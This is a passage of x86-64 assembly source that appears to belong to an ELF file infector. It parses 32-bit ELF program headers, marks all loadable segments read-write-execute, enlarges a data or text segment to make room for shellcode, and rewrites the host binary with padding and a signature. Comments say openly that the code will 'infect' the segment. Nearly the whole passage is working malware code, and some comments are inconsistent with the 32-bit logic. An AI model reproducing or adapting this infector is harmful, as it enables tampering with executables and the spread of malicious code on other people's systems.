		add rdx, 32; rdx += sizeof(Elf64_Phdr)
		jmp loop_p32ephdr
	loop_p32ephdr_exit: 
	add rsp, 2
	add rsp, 4
	add rsp, 4
	pop rdx
	pop rsi
	pop rdi
retn

; unsigned long parse64elfphdrtext(void *file, int wfd)
parse32elfphdrtext:
	push rdi
	push rsi
	push rdx

	sub rsp, 4; p_memsz
	sub rsp, 4;p_flags
	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 44]
	mov WORD[rsp], bx; e_phnum stored
	xor rbx, rbx 
	mov ebx, DWORD[rdi + 28]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_p32ephdrt: 
		cmp cx, WORD[rsp]
		jge loop_p32ephdrt_exit
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne print_p32ephdrt
		push rax
		push rcx
		push rsi
		push rdx
		mov rsi, r9
		mov rdx, 4
		mov rax, 1
		syscall; write(wfd, &curr_phdr, sizeof(uint32_t))
		pop rdx
		pop rsi
		pop rcx
		pop rax	
		mov DWORD[rsp + 2], 7; PF_X | PF_W |PF_R make all load segments RWE
		cmp DWORD[r9 + 24], 5; phdr.p_flags == (PF_R | PF_E) means text seg, we're gonna infect it
		je p32ephdrt_data_seg
		;we just write the rest of the phdr if we get here
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [r9 + 4]
		mov rdx, 20; 32-4 - 8( p_flags & p_align)
		mov rax, 1
		syscall; write(wfd, phdr + 8, sizeof(Elf64_Phdr) - 8)
		pop rdx
		pop rsi
		pop rcx
		pop rax
				;write p_flags
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [rsp + 34] ;p_flags, add 32 because of pushed values
		mov rdx, 4; sizeof(uint32_t)
		mov rax, 1
		syscall; write(wfd, &(PF_X | PF_W |PF_R ), sizeof(uint32));
		pop rdx
		pop rsi
		pop rcx
		pop rax
		;write remaining p_align
		push rax
		push rcx
		push rsi
		push rdx
		mov rdx, 4
		lea rsi, [r9 + 28]
		mov rax, 1
		syscall; write(wfd, &phdr.p_align, sizeof(uint64_t));
		pop rdx
		pop rsi
		pop rcx
		pop rax	
		jmp continue_p32ephdrt		
		p32ephdrt_data_seg:
		;we found the data segment ! bss ect... Time to infect !
		;write till p_filesz
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [r9 + 4]
		mov rdx, 12; sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2
		mov rax, 1
		syscall; write(wfd, phdr + 8, sizeof(Elf64_Off) + sizeof(Elf64_Addr) * 2);
		pop rdx
		pop rsi
		pop rcx
		pop rax
		xor rax, rax
		mov eax, DWORD[r9 + 20]
		mov DWORD[rsp + 6], eax; store p_memsz
		add DWORD[rsp + 6], SHELLCODE32_LEN; ADD SHELLCODE LEN (1 as sample)
		;write custom memsz, filesz
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [rsp + 38]; 32 from push + 6 rsp
		mov rdx, 4
		mov rax, 1
		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8);
		mov rax, 1
		syscall; write(wfd, &(*memsz + SHELLCODE_LEN), 8); repeat since filesize == memsz now
		pop rdx
		pop rsi
		pop rcx
		pop rax
		;write p_flags
		push rax
		push rcx
		push rsi
		push rdx
		lea rsi, [rsp + 34] ;p_flags, add 32 because of pushed values
		mov rdx, 4; sizeof(uint32_t)
		mov rax, 1
		syscall; write(wfd, &(PF_X | PF_W |PF_R ), sizeof(uint32));
		pop rdx
		pop rsi
		pop rcx
		pop rax
		;write remaining p_align
		push rax
		push rcx
		push rsi
		push rdx
		mov rdx, 4
		lea rsi, [r9 + 28]
		mov rax, 1
		syscall; write(wfd, &phdr.p_align, sizeof(uint64_t));
		pop rdx
		pop rsi
		pop rcx
		pop rax	
		sub DWORD[rsp + 6], SHELLCODE32_LEN; restore memsz for pad calc
		;set pad value
		xor rax, rax
		mov eax, DWORD[rsp + 6]; p_memsz
		sub eax, [r9 + 16]; ret = p_memsz - p_filesz

		jmp continue_p32ephdrt
		print_p32ephdrt: ; case where we don't modify the phdr at all 
			push rax
			push rcx
			push rsi
			push rdx

			mov rsi, r9
			mov rdx, 32; sizeof(Elf64_Phdr)
			mov rax, 1
			syscall; write(wfd, &curr_phdr, sizeof(Elf64_Phdr));
			pop rdx
			pop rsi
			pop rcx
			pop rax
		continue_p32ephdrt:
		inc rcx
		add rdx, 32; rdx += sizeof(Elf64_Phdr)
		jmp loop_p32ephdrt
	loop_p32ephdrt_exit: 
	add rsp, 2
	add rsp, 4
	add rsp, 4
	pop rdx
	pop rsi
	pop rdi
retn



parse32elfsec:
	mov r12, rax; copy rax into r12 for jmp calc
	sub rsp, 8; file copy 
	sub rsp, 8; offset of "new sect", where we will put pad and shellcode
	sub rsp, 8;start offset 
	mov r9, rdx; we're gonna need rdx for syscalls, store fsize
	mov QWORD[rsp+16], rdi; save void * file
	; find offset where we will put our shellcode
	cmp rax, 0
	je fets_sect32
	call find_end_data_seg32 ; rax now contains the offset to the beg of pad & shellcode
	jmp fes_done32
	fets_sect32:
	call find_end_text_seg32
	fes_done32: 
	mov [rsp + 8], rax
	; first we swap file and wfd for syscalls
	mov rbx, rsi
	mov rsi, rdi
	mov rdi, rbx
	;now we need to calculate the offset to EHDR + PHDR*e_phnum
	xor rbx, rbx
	mov bx, WORD[rsi + 44]; bx == e_phnum
	xor rax, rax
	mov eax, 32; sizeof(Elf64_Phdr)
	mul rbx; rbx * rax -> rax
	add eax, DWORD[rsi + 28]; e_phoff
	mov [rsp], rax; [rsp] ==  e_phoff + (sizeof(Elf64_Phdr) * e_phnum)
	lea rsi, [rsi + rax]; file after phdrs
	mov rdx, QWORD[rsp + 8]; offset new sect
	sub rdx, [rsp]; rdx == (new_sect - start)
	mov rax, 1
	syscall;write(wfd, file + start, new_sect - start); basically print all from phdrs till end of data seg
	xor rcx, rcx
	loop_print_pad32:
	cmp rcx, r10
	jae loop_print_pad_end32
	push rsi
	push rcx
	push 0x00000000
	lea rsi, [rsp]
	mov rdx, 1
	mov rax, 1
	syscall; write(wfd, "\0", 1);
	pop rdx; pop the "\0"
	pop rcx
	pop rsi
	inc rcx
	jmp loop_print_pad32
	loop_print_pad_end32:
;	call write_shellcode32
	mov rsi, QWORD[rsp + 16]
;	call write_jmp_shellcode32
;	call write_exit_shellcode32; so it doesn't segv when ret is reached in original code
	call write_signature
	mov rsi, QWORD[rsp + 16]
	add rsi, QWORD[rsp + 8];point to offset end of data seg in file
	mov rdx, r9 ; fsize
	sub rdx, QWORD[rsp + 8]; fsize - new_sect
	mov rax, 1
	syscall;write(wfd, file + new_sect, fsize - new_sect);
	add rsp, 8
	add rsp, 8
	add rsp, 8
retn

; unsigned long find_end_data_seg(void *)
; will return the offset at which shellcode starts and where dataseg ends
find_end_data_seg32:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 44]
	mov WORD[rsp], bx; e_phnum stored
	xor rbx, rbx
	mov ebx, DWORD[rdi + 28]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_feds32: 
		cmp cx, WORD[rsp]
		jge loop_feds_exit32
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_feds32
		cmp DWORD[r9 + 24], 6; phdr.p_flags == (PF_R | PF_W) means data seg, we're gonna infect it
		jne continue_feds32
		;we found the data segment ! bss ect... This is where the shellcode will be
		xor rax, rax
		mov eax, DWORD[r9 + 16];store p_filesz
		add eax, DWORD[r9 + 4]; add p_offset so this gives us "the end" of the segment
		continue_feds32:
		inc rcx
		add rdx, 32; rdx += sizeof(Elf64_Phdr)
		jmp loop_feds32
	loop_feds_exit32: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn

; unsigned long find_end_text_seg(void *)
; will return the offset at which shellcode starts and where dataseg ends
find_end_text_seg32:
	push rdi
	push rsi
	push rdx
	push rcx
	push rbx
	push r9

	sub rsp, 2; e_phnum

	xor rax, rax
	mov bx,  WORD[rdi + 44]
	mov WORD[rsp], bx; e_phnum stored
	xor rbx, rbx
	mov ebx, DWORD[rdi + 28]
	add rdi, rbx; rdi now point to e_phoff
	mov rbx, rdi; swap rdi and rsi for syscalls
	mov rdi, rsi
	mov rsi, rbx

	xor rcx, rcx
	xor rdx, rdx; this will iterate over the phdrs, and increment of sizeof(phdr)
	loop_fets32: 
		cmp cx, WORD[rsp]
		jge loop_fets_exit32
		lea r9, [rsi+rdx]; current phdr
		cmp DWORD[r9], 1; cmp phdr.p_type and PT_LOAD (== 1)
		jne continue_fets32
		cmp DWORD[r9 + 24], 5; phdr.p_flags == (PF_R | PF_X) means text seg, we're gonna infect it
		jne continue_fets32
		;we found the data segment ! bss ect... This is where the shellcode will be
		xor rax, rax
		mov eax, DWORD[r9 + 16];store p_filesz
		add eax, DWORD[r9 + 4]; add p_offset so this gives us "the end" of the segment
		continue_fets32:
		inc rcx
		add rdx, 32; rdx += sizeof(Elf64_Phdr)
		jmp loop_fets32
	loop_fets_exit32: 
	add rsp, 2
	
	pop r9
	pop rbx
	pop rcx
	pop rdx
	pop rsi
	pop rdi
retn

end_of_everything: